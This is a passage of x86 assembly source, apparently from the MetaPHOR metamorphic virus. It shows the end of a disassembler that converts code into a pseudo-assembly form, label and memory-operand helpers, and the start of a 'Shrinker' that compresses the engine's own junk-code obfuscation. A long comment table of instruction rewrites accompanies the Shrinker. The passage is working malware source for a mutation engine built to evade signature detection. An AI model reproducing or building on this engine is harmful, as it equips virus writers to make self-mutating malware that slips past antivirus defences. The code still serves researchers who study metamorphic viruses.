                mov     ecx, eax
                pop     eax
                cmp     ecx, 0EBh       ; Check if it's a short JMP
                jz    @@Add2ToEIP       ; If it is, increase the EIP only by 2
                add     esi, 3
        @@Add2ToEIP:
                add     esi, 2

                call    InsertLabel     ; Insert the label

                mov     [edi+1-10h], edx ; Set the label in the instruction

;; When we arrive here we scan for a label that isn't disassembled yet, We
;; check if we disassembled the pointing code while we didn't arrive here.
;; If the code is already disassembled, we set the label and we check other
;; pointers until we found one that it isn't scanned. If all them are alredy
;; disassembled, we finish because all the reachable code is disassembled.
   @@GetEIPFromFutureLabelList:
                mov     ecx, [ebp+NumberOfLabelsPost]
                or      ecx, ecx        ; If there aren't labels, exit
                jz    @@FinDeTraduccion
                mov     ebx, [ebp+FutureLabelTable]
       @@LoopCheckForNewEIP:
                mov     eax, [ebx]      ; Get a label
                or      eax, eax        ; Is it empty?
                jnz   @@GetNewEIP       ; If not, we found one
                add     ebx, 8          ; Check next
                sub     ecx, 1
                or      ecx, ecx        ; Have we scanned all them?
                jnz   @@LoopCheckForNewEIP
                jmp   @@FinDeTraduccion ; If so, exit from disassembler

       @@GetNewEIP:
                mov     esi, [ebx]
                jmp   @@LoopTrace


;;; Instructions beginning with 0F
     @@Opcode0F:
                mov     eax, [esi+1]  ; Get the second opcode
                and     eax, 0FFh
                cmp     eax, 80h      ; Long Jcc?
                jb    @@Op0F_Next00
                cmp     eax, 8Fh
                jbe   @@Jcc32         ; If so, jump
       @@Op0F_Next00:
                cmp     eax, 0B6h     ; MOVZX?
                jz    @@Op0F_MOVZX
;                 cmp     eax, 0BEh
;                 jz    @@Op0F_MOVSX

                add     esi, 2        ; Add two to the EIP and continue
                jmp   @@SigueInstr

;; I decided to make MOVSX instruction using direct checking and
;; sign extension, because this instruction have little variation when
;; recoding (or it is too much long). Anyway, I left the code (commented)
;; because maybe I decide to put it again, to disassemble whatever code I
;; want to pass to this routine, for example (and not only a semi-controlled
;; code as the engine is).
       @@Op0F_MOVZX:
                mov     eax, 0F8h     ; Set the pseudoopcode F8
;                 jmp   @@Op0F_MOVxX
;        @@Op0F_MOVSX:
;                 mov     eax, 0FAh
;        @@Op0F_MOVxX:
                mov     [edi], eax
                mov     eax, [esi+2]  ; Get the destiny register
                and     eax, 38h
                shr     eax, 3
                mov     [edi+7], eax  ; Set it in the instruction
;                 mov     eax, [esi+2]
;                 and     eax, 0C0h
;                 cmp     eax, 0C0h
;                 jz    @@Op0F_MOVxX_RegReg8
;                 mov     eax, [edi]
;                 add     eax, 1
;                 mov     [edi], al
                mov     edx, esi      ; Decode the referenced memory address
                add     edx, 2
                call    DecodeMemoryConstruction
                add     esi, ebx
                add     esi, 2
                jmp   @@NextInstruction
;        @@Op0F_MOVxX_RegReg8:
;                 mov     eax, [esi+2]
;                 and     eax, 7
;                 mov     [edi+1], eax
;                 add     esi, 3
;                 jmp   @@NextInstruction


;; For the translation of Jcc (both 8 bits and 32 bits) and CALLs:
;;
;;  - If the code exists, translate the destiny address of the point into a
;;   label in the label table, and complete the instruction with that label.
;;   If the label already exists, use the already existent label, of course.
;;
;;  - If the code doesn't exist, we put a reference to this instruction in
;;   the "future label table", together with a reference to the code it's
;;   trying to access. Later, when that referenced code is disassembled,
;;   the instruction (Jcc, CALL, etc.) will be completed.

;;; Conditional 32-bit jump (Jx, JNx)
     @@Jcc32:   mov     eax, [esi+2]  ; Get the destiny address in EAX
                add     eax, esi
                add     eax, 6
                jmp   @@ContinueWithBranchInstr

;;; CALL
     @@CALL:    mov     eax, [esi+1]  ; Get the destiny address in EAX
                add     eax, esi
                add     eax, 5
                jmp   @@ContinueWithBranchInstr


;;; Conditional 8-bits jump (Jx, JNx)

     @@Jcc:     mov     eax, [esi+1] ; Get the destiny address in EAX
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@Jcc_01
                add     eax, 0FFFFFF00h
          @@Jcc_01:
                add     eax, esi
                add     eax, 2

     @@ContinueWithBranchInstr:
                mov     ecx, eax              ; Put the destiny addr. in ECX
                call    SetInFutureLabelList  ; Mark the label and get the
                push    eax                   ; label table entry in EAX
                mov     eax, [esi]
                and     eax, 0FFh    ; Get the opcode
                cmp     eax, 0Fh     ; 0F? (i.e. long Jcc)
                jz    @@Jcc_Jcc32

                ;mov     [edi], al
                cmp     eax, 0E8h    ; CALL?
                jz    @@Jcc_AddEIP5  ; Then add 5 to EIP. If not, add 2.
                jmp   @@Jcc_AddEIP2

   @@Jcc_Jcc32:
                mov     eax, [esi+1] ; Get the conditional jump
                and     eax, 0FFh
                sub     eax, 10h     ; Transform it to pseudoopcode

    @@Jcc_AddEIP6:
                inc     esi
    @@Jcc_AddEIP5:
                add     esi, 3
    @@Jcc_AddEIP2:
                add     esi, 2       ; Increase the EIP
                mov     edx, [edi]   ; Set the pseudoopcode in EAX
                and     edx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, edx
                mov     [edi], eax

                pop     eax
                or      eax, eax     ; Restore the label table entry pointer.
                jz    @@NextInstruction ; If it's 0, is because it wasn't
                                        ; scanned, so go for next instruction.

                call    InsertLabel  ; Insert the label if the EIP was already
                mov     [edi+1], edx ; disassembled, and insert it in the
                jmp   @@NextInstruction ; instruction, completing it.

     @@FinDeTraduccion:   ; Return!
                ret
DisasmCode      endp


;; This function is constructed to save lines of code, because this same
;; method was called from several points.
GenOp_SetRegReg proc
                push    edx
                mov     edx, [edi]
                and     edx, 0FFFFFF00h
                mov     eax, [esi]  ; Get the opcode
                and     eax, 0FFh
                cmp     eax, 3Fh    ; Check the instruction. If it's <= 3F,
                jbe   @@SRR_01      ; set the same opcode + 1
                cmp     eax, 85h    ; TEST?
                jbe   @@SRR_02
;                cmp     eax, 87h    ; XCHG?
;                jbe   @@SRR_03
                cmp     eax, 8Bh    ; MOV?
                jbe   @@SRR_04
     @@SRR_01:  and     eax, 38h    ; Set the OP Reg,Reg
                add     eax, 1
     @@SRR_Store:
                add     eax, edx
                mov     [edi], eax  ; Store the opcode
                pop     edx
                ret                 ; Return
     @@SRR_02:  mov     eax, 48h+1  ; Pseudoopcode of TEST Reg,Reg
                jmp   @@SRR_Store
 ;    @@SRR_03:  mov     eax, 48h+5
 ;               jmp   @@SRR_Store
     @@SRR_04:  mov     eax, 40h+1  ; Pseudoopcode of MOV Reg,Reg
                jmp   @@SRR_Store
GenOp_SetRegReg endp

;; Function to insert a label from a Jcc or a CALL to future disassembly. If
;; the label is already disassembled, it returns EAX != 0, being EAX the
;; code referenced. If it's not disassembled, we store the label in the table
;; and we'll check for it everytime a leaf of the execution tree is finished.

SetInFutureLabelList proc
                mov     ebx, [ebp+InstructionTable] ; Get the instructions
                cmp     ebx, edi         ; Are we at the end already?
                jz    @@SetFutureLabel   ; If so, we didn't find that, so
      @@LoopCheckLabelForJcc:            ;  insert the label.
                cmp     [ebx+0Ch], eax
                jz    @@Jcc_CodeDefined  ; If the code is disassembled, return
                add     ebx, 10h
                cmp     ebx, edi         ; Get next instruction
                jnz   @@LoopCheckLabelForJcc
      @@SetFutureLabel:                  ; We didn't find it!
                mov     edx, [ebp+NumberOfLabelsPost]
                shl     edx, 3
                add     edx, [ebp+FutureLabelTable]
                mov     [edx], eax       ; Store the instruction and the
                mov     [edx+4], edi     ;  referenced destiny address.
                mov     eax, [ebp+NumberOfLabelsPost]
                add     eax, 1                        ; Increase the number
                mov     [ebp+NumberOfLabelsPost], eax ; of labels.
                xor     eax, eax               ; Return 0
      @@Jcc_CodeDefined:
                ret
SetInFutureLabelList endp

;; Function InsertLabel
;; Simply inserts the address passed into the definitive label list.
;;
;; Params:
;; EAX = Destination address of jump (or call, etc.)
;; EBX = Instruction in list (dissasembled) where EAX points to
;; Returns:
;;     ECX undefined
;;     EDX = Address in the list where the label has been stored (formerly
;;           the type of label we'll use in the instructions).
InsertLabel     proc
                mov     edx, [ebp+LabelTable]  ; Get the table
                mov     ecx, [ebp+NumberOfLabels]
                or      ecx, ecx               ; Check if there's any
                jz    @@Jcc_InsertaEtiqueta    ; If not, insert at first pos.
      @@Jcc_LoopEtiqueta:
                cmp     [edx], eax            ; Check if it exists already
                jz    @@Jcc_EtiquetaYaPuesta  ; If it exists, return the ptr
                add     edx, 8
                dec     ecx                   ; Check next
                or      ecx, ecx
                jnz   @@Jcc_LoopEtiqueta
      @@Jcc_InsertaEtiqueta:            ; We didn't find the address, so let's
                mov     [edx], eax      ; insert the new label and return the
                mov     [edx+4], ebx    ; pointer
                push    eax
                mov     eax, [ebx+0Bh]  ; Set the label mark in the instruction
                and     eax, 0FFFFFF00h ; we are referencing
                add     eax, 1
                mov     [ebx+0Bh], eax
                mov     eax, [ebp+NumberOfLabels] ; Increase the counter of
                add     eax, 1                    ; labels stored in the table
                mov     [ebp+NumberOfLabels], eax
                pop     eax             ; Return the label pointer address
      @@Jcc_EtiquetaYaPuesta:
                ret
InsertLabel     endp

;; This function scans the "future labels table" and looks if every entry in
;; the table is pointing to the current EIP. If it is, it inserts a label in
;; the "definitive label table", completes the referenced instruction and
;; continues the check until all the temporary labels that points to that code
;; are released.
ReleaseFutureLabels proc
                mov     ecx, [ebp+NumberOfLabelsPost] ; Check the number
                or      ecx, ecx
                jz    @@SigueInstr                    ; If it's 0, return
                mov     ebx, [ebp+FutureLabelTable]
      @@LoopCheckFutureLabel:
                cmp     [ebx], esi        ; Check if the current EIP is in the
                jz    @@FutureLabelFound  ; table. If it is, release it.
      @@OtraEtiquetaFutura:
                add     ebx, 8        ; Get the next
                dec     ecx
                or      ecx, ecx      ; If there are more, loop
                jnz   @@LoopCheckFutureLabel
      @@SigueInstr:
                ret
      @@FutureLabelFound:
                push    ecx

                push    ebx           ; Insert a label into the current EIP
                mov     eax, esi
                mov     ebx, edi
                call    InsertLabel
                pop     ebx           ; Returns EDX = label entry

                mov     eax, [ebx+4]  ; Get the address of the instruction to
                mov     [eax+1], edx  ; complete and complete it.
                xor     ecx, ecx
                mov     [ebx], ecx    ; Eliminate the buffered label
                pop     ecx
                jmp   @@OtraEtiquetaFutura ; Jump to get another
ReleaseFutureLabels endp

;; This function decodes a memory reference in an opcode which is pointed by
;; EDX. Since the struct we use for memory codifications is common for all
;; the instructions of the pseudoassembler, the decodification of the memory
;; reference opcodes and fields are equal for all them.
;;
;; EDX = Address to get opcodes from.
;; We must ensure that it's a memory construction.
;; Returns EBX = Length of the memory reference opcodes (opcodes and addition)
DecodeMemoryConstruction proc
                mov     eax, 00000808h ; Initialize the memory structure
                mov     [edi+1], eax
                xor     eax, eax
                mov     [edi+3], eax
                mov     ebx, 1         ; Set a length of 1 (at least this
                                       ; opcode)

                mov     eax, [edx]     ; Get the opcode
                and     eax, 7         ; Special opcode?
                cmp     eax, 4
                jz    @@ThirdOpcodeUsed ; If so, a third opcode is used
                cmp     eax, 5         ; Direct memory address?
                jz    @@DirectMemory   ; Jump, then

      @@SetBaseRegister:
                mov     eax, [edx]     ; Get the base index
                and     eax, 7
                push    edx
                mov     edx, [edi+1]   ; Set it
                and     edx, 0FFFFFF00h
                add     eax, edx
                pop     edx
                mov     [edi+1], eax
                mov     eax, [edx]     ; Get the type of addition:
                and     eax, 0C0h
                or      eax, eax       ; No addition?
                jz    @@NoAddition
                cmp     eax, 40h       ; Byte (with sign extension)?
                jz    @@ByteAddition
      @@DwordAddition:
                add     ebx, 4         ; Set dword addition (length of 4)
                mov     eax, [edx+1]   ; Get the addition and set it in the
                jmp   @@SetAddition    ;  pseudoassembler instruction
      @@ByteAddition:
                add     ebx, 1         ; Set a byte addition (length of 1)
                mov     eax, [edx+1]   ; Get the addition
                and     eax, 0FFh      ; Extend the sign
                cmp     eax, 7Fh
                jbe   @@SetAddition
                add     eax, 0FFFFFF00h
      @@SetAddition:
                mov     [edi+3], eax   ; Set the addition value in the instr.
      @@NoAddition:
                ret                    ; Return

      @@DirectMemory:
                mov     eax, [edx]     ; Get the DWORD of the address
                and     eax, 0C0h
                or      eax, eax        ; Check if it's EBP
                jnz   @@SetBaseRegister ; If it's EBP, jump to decode it
                jmp   @@DwordAddition   ; If not, set the addition as a direct
                                        ; memory address

      ;; Here if we use a third opcode
      @@ThirdOpcodeUsed:
                add     ebx, 1          ; Add one more byte to the length
                mov     eax, [edx+1]    ; Get the third opcode
                and     eax, 38h        ; Check the middle index
                shr     eax, 3
                cmp     eax, 4          ; If it's ESP then we use only one
                jz    @@IgnoreScalarRegister
                mov     ecx, eax        ; Get the multiplicator (or scalar)
                mov     eax, [edx+1]    ; from the bits 7&6 of the third
                and     eax, 0C0h       ; opcode, and after that set the
                or      eax, ecx        ; register into the pseudoassembler
                push    edx             ; instruction
                mov     edx, [edi+2]
                and     edx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, edx
                pop     edx
                mov     [edi+2], eax
      @@IgnoreScalarRegister:
                mov     eax, [edx]      ; Get the second opcode
                and     eax, 0C0h       ; Are we adding something?
                or      eax, eax        ; If we don't, EBP in the low bits of
                jz    @@EBPMeansDwordAddition ; the third opcode means DWORD
                mov     eax, [edx+1]                              ; addition
                and     eax, 7          ; Get the low index at 3rd
                push    edx
                mov     edx, [edi+1]    ; Set the index at first position
                and     edx, 0FFFFFF00h ; in the memory struct
                add     eax, edx
                pop     edx
                mov     [edi+1], eax
                mov     eax, [edx]      ; Get the addition from the 2nd opcode
                and     eax, 0C0h
                cmp     eax, 40h
                jz    @@ByteAddition2   ; Byte addition (sign extended)?
      @@DwordAddition2:
                add     ebx, 4          ; Add the DWORD addition length, get 
                mov     eax, [edx+2]    ; the addition DWORD and jump.
                jmp   @@SetAddition2
      @@ByteAddition2:
                add     ebx, 1          ; Set BYTE addition length, get the 
                mov     eax, [edx+2]    ; addition BYTE, extend the sign of 
                and     eax, 0FFh       ; it and store it
                cmp     eax, 7Fh
                jbe   @@SetAddition2
                add     eax, 0FFFFFF00h
      @@SetAddition2:
                mov     [edi+3], eax    ; Store the addition and return
                ret

      @@EBPMeansDwordAddition:
                mov     eax, [edx+1]    ; Get the low register at 3rd opcode
                and     eax, 7
                cmp     eax, 5          ; Check if it's EBP
                jz    @@DwordAddition2  ; If it isn't, jump to decode only the
                push    edx             ; addition (EBP is a special case in
                mov     edx, [edi+1]    ; this case)
                and     edx, 0FFFFFF00h
                add     eax, edx        ; If not, set the index register at
                pop     edx             ; the first slot of the index position
                mov     [edi+1], eax    ; in the memory reference structure
                ret                     ; and return.
DecodeMemoryConstruction endp
;;
;;
;; End of the disassembler
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!Shrinker
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; *********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The Shrinker
;; ------------
;;
;; Required parameters:
;; [InstructionTable] = Pointer to first instruction in instruction table
;; [AddressOfLastInstruction] = The limit of the disassembly
;;
;; This function will eliminate all the obfuscation done by the expander in
;; previous generations. The compression is made by single instructions, pairs
;; or triplets. The work is performed in the pseudo-ASM the disassembler
;; generated, so the modifications are easier.
;;
;; The single, pairs and triplets scanned are the following (extracted from
;; the article I wrote about this engine):
;;
;; ---------------------------------------------------------------------------
;;
;;  Legend:
;;  Reg: A register
;;  Mem: A memory address
;;  Imm: Immediate
;;
;;  When in an instruction is Reg,Reg or something like that, both are the
;;  same register. If they are different, I write it as Reg,Reg2 (for example).
;;
;;  Transformations over single instructions:
;;
;;   XOR Reg,-1               --> NOT Reg
;;   XOR Mem,-1               --> NOT Mem
;;   MOV Reg,Reg              --> NOP
;;   SUB Reg,Imm              --> ADD Reg,-Imm
;;   SUB Mem,Imm              --> ADD Mem,-Imm
;;   XOR Reg,0                --> MOV Reg,0
;;   XOR Mem,0                --> MOV Mem,0
;;   ADD Reg,0                --> NOP
;;   ADD Mem,0                --> NOP
;;   OR  Reg,0                --> NOP
;;   OR  Mem,0                --> NOP
;;   AND Reg,-1               --> NOP
;;   AND Mem,-1               --> NOP
;;   AND Reg,0                --> MOV Reg,0
;;   AND Mem,0                --> MOV Mem,0
;;   XOR Reg,Reg              --> MOV Reg,0
;;   SUB Reg,Reg              --> MOV Reg,0
;;   OR  Reg,Reg              --> CMP Reg,0
;;   AND Reg,Reg              --> CMP Reg,0
;;   TEST Reg,Reg             --> CMP Reg,0
;;   LEA Reg,[Imm]            --> MOV Reg,Imm
;;   LEA Reg,[Reg+Imm]        --> ADD Reg,Imm
;;   LEA Reg,[Reg2]           --> MOV Reg,Reg2
;;   LEA Reg,[Reg+Reg2]       --> ADD Reg,Reg2
;;   LEA Reg,[Reg2+Reg2+xxx]  --> LEA Reg,[2*Reg2+xxx]
;;   MOV Reg,Reg              --> NOP
;;   MOV Mem,Mem              --> NOP (result of a compression of
;;                                     PUSH Mem/POP Mem, with pseudoopcode 4F)
;;
;; The instructions that are eliminated (the ones that mean NOP) are be used
;; as garbage along the executable code. Since every NOP instruction can be
;; expanded (for example, MOV Reg,Reg can be set as PUSH Reg/POP Reg, and every
;; PUSH and POP also can be expanded, and so on) you can't know what's garbage
;; and what's not until you have compressed everything.
;;
;; The pairs of instructions that MetaPHOR can compress are:
;;
;;   PUSH Imm / POP Reg                      --> MOV Reg,Imm
;;   PUSH Imm / POP Mem                      --> MOV Mem,Imm
;;   PUSH Reg / POP Reg2                     --> MOV Reg2,Reg
;;   PUSH Reg / POP Mem                      --> MOV Mem,Reg
;;   PUSH Mem / POP Reg                      --> MOV Reg,Mem
;;   PUSH Mem / POP Mem2                     --> MOV Mem2,Mem (codificated
;;                                                with pseudoopcode 4F)
;;   MOV Mem,Reg/PUSH Mem                    --> PUSH Reg
;;   POP Mem / MOV Reg,Mem                   --> POP Reg
;;   POP Mem2 / MOV Mem,Mem2                 --> POP Mem
;;   MOV Mem,Reg / MOV Reg2,Mem              --> MOV Reg2,Reg
;;   MOV Mem,Imm / PUSH Mem                  --> PUSH Imm
;;   MOV Mem,Imm / OP Reg,Mem                --> OP Reg,Imm
;;   MOV Reg,Imm / ADD Reg,Reg2              --> LEA Reg,[Reg2+Imm]
;;   MOV Reg,Reg2 / ADD Reg,Imm              --> LEA Reg,[Reg2+Imm]
;;   MOV Reg,Reg2 / ADD Reg,Reg3             --> LEA Reg,[Reg2+Reg3]
;;   ADD Reg,Imm / ADD Reg,Reg2              --> LEA Reg,[Reg+Reg2+Imm]
;;   ADD Reg,Reg2 / ADD Reg,Imm              --> LEA Reg,[Reg+Reg2+Imm]
;;   OP Reg,Imm / OP Reg,Imm2                --> OP Reg,(Imm OP Imm2)
;;                                                (must be calculated)
;;   OP Mem,Imm / OP Mem,Imm2                --> OP Mem,(Imm OP Imm2)
;;                                                (must be calculated)
;;   LEA Reg,[Reg2+Imm] / ADD Reg,Reg3       --> LEA Reg,[Reg2+Reg3+Imm]
;;   LEA Reg,[(RegX+)Reg2+Imm] / ADD Reg,Reg2 -> LEA Reg,[(RegX+)2*Reg2+Imm]
;;   POP Mem / PUSH Mem                      --> NOP
;;   MOV Mem2,Mem / MOV Mem3,Mem2            --> MOV Mem3,Mem
;;   MOV Mem2,Mem / OP Reg,Mem2              --> OP Reg,Mem
;;   MOV Mem2,Mem / MOV Mem2,xxx             --> MOV Mem2,xxx
;;   MOV Mem,Reg / CALL Mem                  --> CALL Reg
;;   MOV Mem,Reg / JMP Mem                   --> JMP Reg
;;   MOV Mem2,Mem / CALL Mem2                --> CALL Mem
;;   MOV Mem2,Mem / JMP Mem2                 --> JMP Mem
;;   MOV Mem,Reg / MOV Mem2,Mem              --> MOV Mem2,Reg
;;   OP Reg,xxx / MOV Reg,yyy                --> MOV Reg,yyy
;;   Jcc @xxx / !Jcc @xxx                    --> JMP @xxx (this applies to
;;                                                (Jcc & 0FEh) with (Jcc | 1)
;;   NOT Reg / NEG Reg                       --> ADD Reg,1
;;   NOT Reg / ADD Reg,1                     --> NEG Reg
;;   NOT Mem / NEG Mem                       --> ADD Mem,1
;;   NOT Mem / ADD Mem,1                     --> NEG Mem
;;   NEG Reg / NOT Reg                       --> ADD Reg,-1
;;   NEG Reg / ADD Reg,-1                    --> NOT Reg
;;   NEG Mem / NOT Mem                       --> ADD Mem,-1
;;   NEG Mem / ADD Mem,-1                    --> NOT Mem
;;   CMP X,Y / != Jcc (CMP without Jcc)      --> NOP
;;   TEST X,Y / != Jcc                       --> NOP
;;   POP Mem / JMP Mem                       --> RET
;;   PUSH Reg / RET                          --> JMP Reg
;;   CALL Mem / MOV Mem2,EAX                 --> CALL Mem / APICALL_STORE Mem2
;;   MOV Reg,Mem / CALL Reg                  --> CALL Mem
;;   XOR Reg,Reg / MOV Reg8,[Mem]            --> MOVZX Reg,byte ptr [Mem]
;;   MOV Reg,[Mem] / AND Reg,0FFh            --> MOVZX Reg,byte ptr [Mem]
;;
;;
;; Maybe there are more, but this set is sufficient, at least for our
;; proposits. What we do know is scan the code for this situations and then we
;; substitute the first instruction by their equivalent and we overwrite with
;; NOP the second, so the instructions are compressed.
;;
;; But there are more: the triplets:
;;
;;   MOV Mem,Reg
;;   OP Mem,Reg2
;;   MOV Reg,Mem                     --> OP Reg,Reg2
;;
;;   MOV Mem,Reg
;;   OP Mem,Imm
;;   MOV Reg,Mem                     --> OP Reg,Imm
;;
;;   MOV Mem,Imm
;;   OP Mem,Reg
;;   MOV Reg,Mem                     --> OP Reg,Imm (it can't be SUB)
;;
;;   MOV Mem2,Mem
;;   OP Mem2,Reg
;;   MOV Mem,Mem2                    --> OP Mem,Reg
;;
;;   MOV Mem2,Mem
;;   OP Mem2,Imm
;;   MOV Mem,Mem2                    --> OP Mem,Imm
;;
;;   CMP Reg,Reg
;;   JO/JB/JNZ/JA/JS/JNP/JL/JG @xxx
;;   != Jcc                          --> NOP
;;
;;   CMP Reg,Reg
;;   JNO/JAE/JZ/JBE/JNS/JP/JGE/JLE @xxx
;;   != Jcc                          --> JMP @xxx
;;
;;   MOV Mem,Imm
;;   CMP/TEST Reg,Mem
;;   Jcc @xxx                        --> CMP/TEST Reg,Imm
;;                                       Jcc @xxx
;;   MOV Mem,Reg
;;   SUB/CMP Mem,Reg2
;;   Jcc @xxx                        --> CMP Reg,Reg2
;;                                       Jcc @xxx
;;   MOV Mem,Reg
;;   AND/TEST Mem,Reg2
;;   Jcc @xxx                        --> TEST Reg,Reg2
;;                                       Jcc @xxx
;;   MOV Mem,Reg
;;   SUB/CMP Mem,Imm
;;   Jcc @xxx                        --> CMP Reg,Imm
;;                                       Jcc @xxx
;;   MOV Mem,Reg
;;   AND/TEST Mem,Imm
;;   Jcc @xxx                        --> TEST Reg,Imm
;;                                       Jcc @xxx
;;   MOV Mem2,Mem
;;   CMP/TEST Reg,Mem2
;;   Jcc @xxx                        --> CMP/TEST Reg,Mem
;;                                       Jcc @xxx
;;   MOV Mem2,Mem
;;   AND/TEST Mem2,Reg
;;   Jcc @xxx                        --> TEST Mem,Reg
;;                                       Jcc @xxx
;;   MOV Mem2,Mem
;;   SUB/CMP Mem2,Reg
;;   Jcc @xxx                        --> CMP Mem,Reg
;;                                       Jcc @xxx
;;   MOV Mem2,Mem
;;   AND/TEST Mem2,Imm
;;   Jcc @xxx                        --> TEST Mem,Imm
;;                                       Jcc @xxx
;;   MOV Mem2,Mem
;;   SUB/CMP Mem2,Imm
;;   Jcc @xxx                        --> CMP Mem,Imm
;;                                       Jcc @xxx
;;   PUSH EAX
;;   PUSH ECX
;;   PUSH EDX                        --> APICALL_BEGIN
;;
;;   POP EDX
;;   POP ECX
;;   POP EAX                         --> APICALL_END
;;----------------------------------------------------------------------------
;;
;; ShrinkCode acts over the disassembled buffer in [InstructionTable].
;;
ShrinkCode      proc
                mov     edi, [ebp+InstructionTable]
                mov     eax, [edi]
                and     eax, 0FFh   ; Get pseudo-opcode
                call    CheckIfInstructionUsesMem ; Uses a memory address?
                or      eax, eax
                jz    @@Shrink      ; If not, continue
                call    OrderRegs   ; Order the indexes of the instruction
                                    ; from lower to upper
    @@Shrink:   mov     eax, [edi]
                and     eax, 0FFh   ; Get pseudo-op
                cmp     eax, 0FFh   ; Is it NOP?
                jz    @@IncreaseEIP ; If so, increase pointer
                call    ShrinkThisInstructions ; Check for singles, pairs or
                                               ; triplets
                or      eax, eax    ; Do we performed a compression?
                jz    @@IncreaseEIP ; If we don't, increase pointer
                call    DecreaseEIP ; Decrease the pointer three instructions
                call    DecreaseEIP ; to get a possible matching group with
                call    DecreaseEIP ; the two above.
                jmp   @@Shrink      ; Check again

    @@IncreaseEIP:
                call    IncreaseEIP                         ; Increase pointer
                cmp     edi, [ebp+AddressOfLastInstruction] ; Last instruction?
                jnz   @@Shrink                       ; If not, check next group

    @@DecreaseAddressOfLastInstruction:
                sub     edi, 10h        ; Now we eliminate the remaining NOPs
                mov     eax, [edi]      ; at the end of all the instructions.
                and     eax, 0FFh
                cmp     eax, 0FFh
                jnz   @@LastInstructionOK
                mov     [ebp+AddressOfLastInstruction], edi
                jmp   @@DecreaseAddressOfLastInstruction
    @@LastInstructionOK:

    ;; Second pass to find APICALL_BEGIN, APICALL_END and SET_WEIGHT
                mov     edi, [ebp+InstructionTable]

    @@FindAPICALL_X:
    @@GetFirstInstruction:
                call    IncreaseEIP2 ; Increase pointer
                cmp     eax, -1      ; End of instruction table?
                jz    @@EndOfScan    ; If so, finish the search

                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 50h
                jnz   @@ItsNot_SET_WEIGHT
                push    edi
                mov     esi, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 40h
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     edx, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 40h
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     ecx, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 43h
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     ebx, edi

                call    IncreaseEIP2
                or      eax, eax
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 58h
                jnz   @@ItsNot_SET_WEIGHT_2

                mov     eax, [esi+1]
                and     eax, 0FFh
                mov     esi, eax
                mov     eax, [edx+1]
                and     eax, 0FFh
                cmp     eax, esi
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     eax, [edi+1]
                and     eax, 0FFh
                cmp     eax, esi
                jnz   @@ItsNot_SET_WEIGHT_2
                mov     esi, [ecx+1]
                and     esi, 0FFh
                mov     eax, [ebx+7]
                and     eax, 0FFh
                cmp     eax, esi
                jnz   @@ItsNot_SET_WEIGHT_2
                pop     esi
                mov     eax, 0F7h          ; SET_WEIGHT
                mov     [esi], al
                mov     eax, [esi+1]
                mov     [esi+9], al
                mov     eax, [ebx+1]
                mov     [esi+1], eax
                mov     eax, [ebx+3]
                mov     [esi+3], eax
                mov     eax, [edx+7]
                mov     [esi+7], al
                mov     eax, [ecx+1]
                mov     [esi+8], al
                mov     eax, 0FFh
                mov     [edx], eax
                mov     [ecx], eax
                mov     [ebx], eax
                mov     [edi], eax
                jmp   @@AllOK
        @@ItsNot_SET_WEIGHT_2:
                pop     edi
        @@ItsNot_SET_WEIGHT:
        @@AllOK:


    @@CheckAPICALL_X:

                mov     edx, edi     ; Save pointer in EDX
                push    edi

    @@GetSecondInstruction:
                call    IncreaseEIP2 ; Get next
                cmp     eax, -1      ; End of code?
                jz    @@EndOfScan    ; Finish, then
                or      eax, eax     ; Label over the instruction?
                jnz   @@EndOfTriplet ; If there's label, ignore the group
                mov     esi, edi     ; Put pointer in ESI

    @@GetThirdInstruction:
                call    IncreaseEIP2 ; Do the same: increase pointer and check
                cmp     eax, -1      ; for end of code or a label over the
                jz    @@EndOfScan    ; instruction
                or      eax, eax
                jnz   @@EndOfTriplet

                mov     eax, [edx]   ; Get the first instruction
                and     eax, 0FFh
                cmp     eax, 50h     ; PUSH Reg?
                jnz   @@FindAPICALL_END ; If not, check next instruction
                mov     eax, [esi]   ; Get the second instruction
                and     eax, 0FFh
                cmp     eax, 50h     ; PUSH Reg?
                jnz   @@FindAPICALL_END ; If not, next instruction
                mov     eax, [edi]   ; Get the third instruction
                and     eax, 0FFh
                cmp     eax, 50h     ; PUSH Reg?
                jnz   @@FindAPICALL_END ; If not, next instruction
                mov     eax, [edx+1]
                and     eax, 0FFh
                or      eax, eax     ; First instruction is PUSH EAX?
                jnz   @@FindAPICALL_END ; If it isn't, it's not APICALL_*
                mov     eax, [esi+1]
                and     eax, 0FFh
                cmp     eax, 1       ; Is it PUSH ECX?
                jnz   @@FindAPICALL_END ; If not, check other
                mov     eax, [edi+1]
                and     eax, 0FFh
                cmp     eax, 2       ; Is it PUSH EDX
                jnz   @@FindAPICALL_END ; If not, check other
                mov     eax, 0F4h    ; APICALL_BEGIN
      @@SetAPICALL_X:
                mov     [edx], eax   ; Set instruction
                mov     eax, 0FFh
                mov     [esi], eax   ; NOP the second and third instruction
                mov     [edi], eax
                jmp   @@EndOfTriplet ; Check next group

      @@FindAPICALL_END:
                mov     eax, [edx]   ; Get the first instruction
                and     eax, 0FFh
                cmp     eax, 58h     ; POP Reg?
                jnz   @@EndOfTriplet ; If not, next group
                mov     eax, [esi]   ; Check the second instruction
